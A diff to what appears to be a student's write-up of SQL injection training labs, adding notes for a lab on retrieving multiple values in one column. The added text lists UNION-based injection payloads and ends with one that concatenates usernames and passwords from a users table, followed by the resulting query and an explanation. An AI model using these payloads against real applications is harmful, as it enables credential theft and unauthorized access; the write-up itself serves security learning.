@@ -90,8 +90,23 @@ The first column did not accept text and returned an error. The second column ac
 **Result:** Lab solved successfully. Column 2 accepts text.
 ## Lab 6 – Retrieve Multiple Values in One Column
 
-**Payload:**
+**Payloads tested:**
+- `Gifts' UNION SELECT NULL,NULL--` – Worked
+- `Gifts' UNION SELECT NULL,'hello'--` – Worked
 
-**SQL query produced:**
+**Final payload:**
+`Gifts' UNION SELECT NULL,username||'~'||password FROM users--`
+
+**SQL query produced (approximate):**
+
+```sql
+SELECT name, description FROM products
+WHERE category = 'Gifts'
+UNION SELECT NULL, username || '~' || password
+FROM users--';
+```
 
 **Why it worked:**
+The query returned two columns, with the second accepting text. The `||` operator combined each username and password into a single value, separated by `~`. This allowed both values to appear in one column.
+
+**Result:** Lab solved successfully. Retrieved the administrator credentials and logged in.
